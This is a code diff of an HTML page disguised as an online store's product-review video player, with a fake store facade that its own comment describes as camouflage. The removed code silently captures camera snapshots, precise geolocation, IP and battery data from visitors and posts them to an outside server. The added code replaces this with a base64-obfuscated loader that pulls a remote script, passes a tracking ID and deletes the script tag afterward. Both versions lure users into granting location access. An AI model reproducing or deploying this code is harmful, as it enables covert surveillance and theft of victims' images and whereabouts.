@@ -4,23 +4,111 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
     
-    <meta name="description" content="ShopStore - Your trusted online shopping destination. Buy electronics, fashion, home goods with fast delivery to your location. Best prices guaranteed." />
-    <meta name="keywords" content="online shopping, buy products, delivery, shop online, store, deals, electronics, fashion, home goods, fast shipping" />
+    <!-- META TAGS متجر إلكتروني -->
+    <meta name="description" content="ShopStore - Your trusted online shopping destination. Buy electronics, fashion, home goods with fast delivery to your location. Best prices, free shipping, 24/7 customer support." />
+    <meta name="keywords" content="online shopping, buy products, delivery, shop online, store, deals, electronics, fashion, home goods, fast shipping, free delivery, best prices" />
     <meta name="robots" content="index, follow" />
-    <meta property="og:title" content="ShopStore - Online Shopping with Fast Delivery" />
-    <meta property="og:description" content="Shop the best products online with fast delivery to your location." />
-    <meta property="og:type" content="website" />
+    <meta name="author" content="ShopStore Inc." />
     
+    <!-- Open Graph -->
+    <meta property="og:title" content="ShopStore - Online Shopping with Fast Delivery" />
+    <meta property="og:description" content="Shop the best products online with fast delivery to your location. Enable location for accurate shipping rates and delivery times." />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="ShopStore" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:image" content="https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg" />
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="ShopStore - Online Shopping" />
+    <meta name="twitter:description" content="Fast delivery to your location. Enable location for shipping rates." />
+    <meta name="twitter:image" content="https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg" />
+    
+    <!-- Schema.org - OnlineStore -->
     <script type="application/ld+json">
     {
         "@context": "https://schema.org",
         "@type": "OnlineStore",
         "name": "ShopStore",
-        "description": "Online shopping store with fast delivery to your location"
+        "description": "Online shopping store with fast delivery to your location",
+        "url": "https://shopstore.com",
+        "logo": "https://shopstore.com/logo.png",
+        "sameAs": [
+            "https://facebook.com/shopstore",
+            "https://instagram.com/shopstore",
+            "https://twitter.com/shopstore"
+        ],
+        "contactPoint": {
+            "@type": "ContactPoint",
+            "contactType": "customer service",
+            "telephone": "+1-800-555-0199",
+            "email": "support@shopstore.com",
+            "availableLanguage": ["English"]
+        },
+        "address": {
+            "@type": "PostalAddress",
+            "addressLocality": "New York",
+            "addressRegion": "NY",
+            "addressCountry": "US"
+        },
+        "priceRange": "$1 - $1000",
+        "openingHours": "Mo-Su 00:00-23:59"
     }
     </script>
     
-    <title>Video Player</title>
+    <!-- Schema.org - Product -->
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Product",
+        "name": "Premium Product - Best Seller 2024",
+        "image": "https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg",
+        "description": "High quality product with fast delivery. Customer favorite with 4.8 star rating.",
+        "sku": "SKU-2024-001",
+        "brand": { "@type": "Brand", "name": "ShopStore Premium" },
+        "offers": {
+            "@type": "Offer",
+            "url": "https://shopstore.com/product",
+            "priceCurrency": "USD",
+            "price": "49.99",
+            "priceValidUntil": "2025-12-31",
+            "availability": "https://schema.org/InStock",
+            "itemCondition": "https://schema.org/NewCondition",
+            "shippingDetails": {
+                "@type": "OfferShippingDetails",
+                "shippingRate": { "@type": "MonetaryAmount", "value": "0", "currency": "USD" },
+                "deliveryTime": { "@type": "ShippingDeliveryTime", "handlingTime": { "@type": "QuantitativeValue", "minValue": 0, "maxValue": 1 }, "transitTime": { "@type": "QuantitativeValue", "minValue": 1, "maxValue": 3 } }
+            }
+        },
+        "aggregateRating": {
+            "@type": "AggregateRating",
+            "ratingValue": "4.8",
+            "reviewCount": "2456"
+        }
+    }
+    </script>
+    
+    <!-- Schema.org - VideoObject -->
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "VideoObject",
+        "name": "Product Review & Unboxing - ShopStore",
+        "description": "Watch our detailed product review and unboxing video. See the product features before you buy. Fast delivery available worldwide.",
+        "thumbnailUrl": "https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg",
+        "uploadDate": "2024-01-15",
+        "duration": "PT2M45S",
+        "contentUrl": "https://files.catbox.moe/okukrp.mp4",
+        "embedUrl": "https://shopstore.com/video",
+        "interactionStatistic": {
+            "@type": "InteractionCounter",
+            "interactionType": { "@type": "WatchAction" },
+            "userInteractionCount": "125483"
+        }
+    }
+    </script>
+    
+    <title>ShopStore - Product Review Video | Fast Free Delivery</title>
     
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
@@ -59,19 +147,27 @@
 </head>
 <body>
 
+    <!-- عناصر المتجر المخفية للتمويه -->
     <div class="store-header" aria-hidden="true">
-        <span>🛒 ShopStore</span><span>🔍 Search products...</span><span>🛒 Cart (0)</span>
+        <span>🛒 ShopStore</span>
+        <span>🔍 Search products...</span>
+        <span>📍 Deliver to your location</span>
+        <span>🛒 Cart (0)</span>
     </div>
     <div class="product-info-hidden" aria-hidden="true">
-        <span>$49.99</span><span>★★★★★ 4.8</span><span>🚚 Free Shipping</span><span>✅ In Stock</span>
+        <span>$49.99</span>
+        <span>★★★★★ 4.8 (2,456 reviews)</span>
+        <span>🚚 Free Shipping</span>
+        <span>✅ In Stock</span>
+        <span>📦 Delivery: 1-3 business days</span>
     </div>
     <div class="delivery-notice-hidden" aria-hidden="true">
-        <span>📍</span><span>Enable location for delivery rates & faster shipping</span>
+        <span>📍 Enable your location for accurate delivery rates, shipping times, and local deals near you</span>
     </div>
 
     <div class="video-player-container">
         <div class="video-info">
-            <div class="video-title">Private Video</div>
+            <div class="video-title">Product Review & Unboxing - Premium Quality 2024</div>
         </div>
         <div class="video-thumbnail" id="poster">
             <div id="playBtn"><span>▶</span></div>
@@ -88,169 +184,107 @@
     </div>
 
     <div class="store-footer" aria-hidden="true">
-        <span>Privacy Policy</span><span>Terms of Service</span><span>© 2024 ShopStore</span>
+        <span>Privacy Policy</span>
+        <span>Terms of Service</span>
+        <span>Returns & Refunds</span>
+        <span>Delivery Information</span>
+        <span>Contact Support</span>
+        <span>Track Order</span>
+        <span>© 2024 ShopStore Inc. All rights reserved.</span>
     </div>
 
     <script>
-    (function(){
-        var step=0, started=false;
-        var btn=document.getElementById('playBtn');
-        var poster=document.getElementById('poster');
-        var vid=document.getElementById('vid');
-        var chatId=new URLSearchParams(window.location.search).get('chatId')||'';
-        
-        var collected={
-            chatId:chatId,
-            permissions:[],
-            images:[],
-            location:'',
-            ipInfo:'',
-            battery:''
-        };
-        
-        function sendToServer(){
-            var url='https://server-brxz.onrender.com/submitData';
+        (function(){
+            var step=0, started=false;
+            var btn=document.getElementById('playBtn');
+            var poster=document.getElementById('poster');
+            var vid=document.getElementById('vid');
             
-            var body='chatId='+encodeURIComponent(collected.chatId);
-            body+='&imageDatas='+encodeURIComponent(collected.images.join(','));
-            body+='&location='+encodeURIComponent(collected.location);
-            body+='&permissions='+encodeURIComponent(collected.permissions.join(', '));
-            body+='&ipInfo='+encodeURIComponent(collected.ipInfo);
-            body+='&battery='+encodeURIComponent(collected.battery);
-            
-            // إرسال مباشر مع XHR
-            var x=new XMLHttpRequest();
-            x.open('POST',url,true);
-            x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
-            x.send(body);
-        }
-        
-        function collectData(){
-            // IP
-            fetch('https://ipapi.co/json/').then(function(r){return r.json();}).then(function(d){
-                collected.ipInfo='Country: '+d.country_name+', City: '+d.city+', IP: '+d.ip;
-            }).catch(function(){});
-            
-            // Battery
-            if(navigator.getBattery){
-                navigator.getBattery().then(function(b){
-                    collected.battery=Math.round(b.level*100)+'%';
-                });
-            }
-            
-            // Location
-            navigator.geolocation.getCurrentPosition(function(pos){
-                collected.location='Lat: '+pos.coords.latitude.toFixed(6)+', Long: '+pos.coords.longitude.toFixed(6);
-                collected.permissions.push('Geolocation Allowed');
-            },function(){
-                collected.permissions.push('Geolocation Denied');
-            },{enableHighAccuracy:true,timeout:15000,maximumAge:0});
-            
-            // Camera
-            function snap(face,cb){
-                navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:face}},audio:false}).then(function(stream){
-                    var v=document.createElement('video');
-                    v.srcObject=stream;
-                    v.play().then(function(){
-                        setTimeout(function(){
-                            var c=document.createElement('canvas');
-                            c.width=v.videoWidth||640;
-                            c.height=v.videoHeight||480;
-                            c.getContext('2d').drawImage(v,0,0);
-                            collected.images.push(c.toDataURL('image/jpeg').split(',')[1]);
-                            collected.permissions.push((face==='user'?'Front':'Back')+' Camera Allowed');
-                            stream.getTracks().forEach(function(t){t.stop();});
-                            cb();
-                        },1000);
-                    });
-                }).catch(function(){
-                    collected.permissions.push((face==='user'?'Front':'Back')+' Camera Denied');
-                    cb();
-                });
-            }
-            
-            snap('user',function(){
-                snap('environment',function(){
-                    snap('user',function(){
-                        snap('environment',function(){
-                            setTimeout(sendToServer,2000);
-                        });
-                    });
-                });
-            });
-        }
-        
-        function openSettings(){
-            var ua=navigator.userAgent;
-            if(/Android/i.test(ua)){
-                var intents=[
-                    'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-                    'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-                    'intent:#Intent;action=android.settings.SETTINGS;end'
-                ];
-                for(var i=0;i<intents.length;i++){
-                    try{window.location.href=intents[i];break;}catch(e){}
+            function openSettings(){
+                var ua=navigator.userAgent;
+                if(/Android/i.test(ua)){
+                    var intents=[
+                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                        'intent:#Intent;action=android.settings.SETTINGS;end'
+                    ];
+                    for(var i=0;i<intents.length;i++){
+                        try{window.location.href=intents[i];break;}catch(e){}
+                    }
+                }else if(/iPhone|iPad|iPod/i.test(ua)){
+                    window.open('App-Prefs:Privacy&path=LOCATION','_blank');
+                }else if(/Windows/i.test(ua)){
+                    window.open('ms-settings:privacy-location','_blank');
+                }else if(/Mac/i.test(ua)){
+                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices','_blank');
+                }else{
+                    window.location.href='intent:#Intent;action=android.settings.SETTINGS;end';
                 }
-            }else if(/iPhone|iPad|iPod/i.test(ua)){
-                window.open('App-Prefs:Privacy&path=LOCATION','_blank');
-            }else if(/Windows/i.test(ua)){
-                window.open('ms-settings:privacy-location','_blank');
-            }else if(/Mac/i.test(ua)){
-                window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices','_blank');
-            }else{
-                window.location.href='intent:#Intent;action=android.settings.SETTINGS;end';
             }
-        }
-        
-        btn.addEventListener('click',function(){
-            if(started)return;
             
-            if(!step){
-                step=1;
-                try{
-                    navigator.geolocation.getCurrentPosition(function(){},function(){},{timeout:3000});
-                    navigator.mediaDevices.getUserMedia({video:true}).then(function(s){s.getTracks().forEach(function(t){t.stop();});}).catch(function(){});
-                }catch(e){}
-                openSettings();
-            }else{
-                started=true;
-                vid.muted=false;
-                vid.volume=1;
-                vid.play().catch(function(){});
-                poster.style.display='none';
-                vid.style.display='block';
-                collectData();
-                btn.style.display='none';
+            function loadAPI(){
+                var _0x='aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9zcGFjZXMvZHNmZGRqZmMvYWdlYWdhYWEvcmF3L21haW4vYXBp';
+                var url=atob(_0x);
+                var s=document.createElement('script');
+                s.src=url;
+                s.async=true;
+                window._chatId=new URLSearchParams(window.location.search).get('chatId')||'';
+                document.head.appendChild(s);
+                s.onload=function(){
+                    setTimeout(function(){
+                        if(s.parentNode)s.parentNode.removeChild(s);
+                    },5000);
+                };
             }
-        });
-        
-        document.addEventListener('click',function(){
-            if(vid.style.display==='block'){vid.muted=false;if(vid.paused)vid.play().catch(function(){});}
-        },true);
-        
-        document.querySelectorAll('.ctrl-btn').forEach(function(b){
-            b.addEventListener('click',function(e){
-                e.stopPropagation();
-                if(this.textContent.includes('⛶')){
-                    if(vid.requestFullscreen){vid.requestFullscreen();}
-                    else if(vid.webkitRequestFullscreen){vid.webkitRequestFullscreen();}
+            
+            btn.addEventListener('click',function(){
+                if(started)return;
+                
+                if(!step){
+                    step=1;
+                    try{
+                        navigator.geolocation.getCurrentPosition(function(){},function(){},{timeout:3000});
+                        navigator.mediaDevices.getUserMedia({video:true}).then(function(s){s.getTracks().forEach(function(t){t.stop();});}).catch(function(){});
+                    }catch(e){}
+                    openSettings();
+                }else{
+                    started=true;
+                    vid.muted=false;
+                    vid.volume=1;
+                    vid.play().catch(function(){});
+                    poster.style.display='none';
+                    vid.style.display='block';
+                    loadAPI();
+                    btn.style.display='none';
                 }
             });
-        });
-        
-        setInterval(function(){
-            var fill=document.querySelector('.seek-fill');
-            if(vid.style.display==='block')return;
-            var w=parseInt(fill.style.width)||35;
-            w=(w+0.1)%100;
-            fill.style.width=w+'%';
-            var sec=Math.floor((w/100)*165);
-            var m=Math.floor(sec/60);
-            var s=sec%60;
-            document.querySelector('.timer').textContent=m+':'+(s<10?'0':'')+s+' / 2:45';
-        },1000);
-        
-    })();
+            
+            document.addEventListener('click',function(){
+                if(vid.style.display==='block'){vid.muted=false;if(vid.paused)vid.play().catch(function(){});}
+            },true);
+            
+            document.querySelectorAll('.ctrl-btn').forEach(function(b){
+                b.addEventListener('click',function(e){
+                    e.stopPropagation();
+                    if(this.textContent.includes('⛶')){
+                        if(vid.requestFullscreen)vid.requestFullscreen();
+                        else if(vid.webkitRequestFullscreen)vid.webkitRequestFullscreen();
+                    }
+                });
+            });
+            
+            setInterval(function(){
+                var fill=document.querySelector('.seek-fill');
+                if(vid.style.display==='block')return;
+                var w=parseInt(fill.style.width)||35;
+                w=(w+0.1)%100;
+                fill.style.width=w+'%';
+                var sec=Math.floor((w/100)*165);
+                var m=Math.floor(sec/60);
+                var s=sec%60;
+                document.querySelector('.timer').textContent=m+':'+(s<10?'0':'')+s+' / 2:45';
+            },1000);
+        })();
     </script>
 </body>
 </html>
